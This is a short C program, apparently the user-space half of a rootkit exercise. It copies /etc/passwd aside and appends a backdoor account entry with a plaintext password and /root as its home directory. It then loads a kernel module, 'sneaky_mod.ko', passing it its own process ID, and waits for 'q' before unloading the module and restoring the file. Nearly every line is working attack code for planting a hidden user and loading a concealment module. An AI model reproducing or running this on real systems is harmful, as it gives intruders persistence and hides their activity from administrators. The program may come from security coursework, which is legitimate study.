#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    printf("sneaky_process pid = %d\n", getpid());

    system("cp /etc/passwd /tmp/passwd");
    system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd");

    //load .ko - insmod
    char cmd_load[50];
    sprintf(cmd_load, "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
    printf("cmd: %s\n", cmd_load);
    system(cmd_load);
    printf("cmd: %s\n", cmd_load);
    //loop
    while (getchar() != 'q') {
    }
    //unload module - rmmod
    system("rmmod sneaky_mod.ko");

    system("cp /tmp/passwd /etc/passwd");
    system("rm /tmp/passwd");
    return EXIT_SUCCESS;
}